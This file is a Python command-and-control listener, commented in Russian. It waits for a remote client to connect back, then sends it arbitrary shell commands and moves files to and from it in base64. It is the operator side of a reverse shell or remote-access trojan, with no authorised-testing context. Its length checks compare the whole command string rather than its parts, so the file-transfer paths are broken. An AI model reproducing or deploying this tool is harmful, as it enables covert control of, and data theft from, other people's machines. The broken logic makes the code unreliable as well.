import socket 
import base64
from typing import List
import os

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #Настройка подключения
listener.bind(("0.0.0.0", 9990))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()                   #Получение значений сокета и адреса при подтверждении подключения
print(f"[+] Got a connection from {remote_address} ")

def download_from_client(command):              #Скачивание файла с клиента
    _, _, file, newpath = command.split(' ')
    cl_socket.send(command.encode())                    #Отправка команды клиенту
    file = cl_socket.recv(1572864)                         #Получение значения файла
    message = file.decode()
    if("Error:" in message):
        print(message)
    else:
        path=newpath.split('/')
        n=len(path)
        pathdir:str = ""
        for i in range(n-1):
            pathdir=pathdir+path[i]+"/"
        if not os.path.exists(pathdir):
            os.makedirs(pathdir)
        with open((newpath),"wb") as output_file:
            output_file.write(base64.b64decode(file))       #Создание и заполнение файла
        print(f"Файл скачен на сервер по пути {newpath}")

def download_from_server(command):              #Скачивание файла с сервера
    _, file, newpath = command.split()
    try:
        with open(file, "+rb") as file:
            file=base64.b64encode(file.read())              #Сохранение значения файла
        cl_socket.send(f"dl {newpath}".encode())            #Отправка комманды на клиент
        cl_socket.send(file)                                #Отправка значения файла
        response = cl_socket.recv(1024).decode()            #Получение ответа
        print(response)
    except(Exception) as e:
        print(e)

def console_command(command):                   #Обычная команда для терминала
    cl_socket.send(command.encode())                    #Отправка команды на клиент
    response = cl_socket.recv(1024).decode()            #Получение ответа
    print(response)

def interact_console():                         #Взаимодейтсвие с консолью
    try:

        while True:
            command :str = input(">> ")             #Ввод команды
            if "dl" in command:                     #Если это команда скачивания dl «откуда» «куда»
                if ("-b" in command and len(command)==4):
                    download_from_client(command)   #Если это скачивание с клиента dl -b «откуда» «куда»
                elif(len(command)==3):
                    download_from_server(command)   #Если это скачивание с сервера
                else:
                    print("Неправильный формат команды. Пример команды: dl «-b» «путь к файлу» «новый путь файла»")
            else:
                console_command(command)            #Если это обычное команда для терминала
            
    except KeyboardInterrupt:                       #Прерывание программы
        listener.close()
        exit()

interact_console()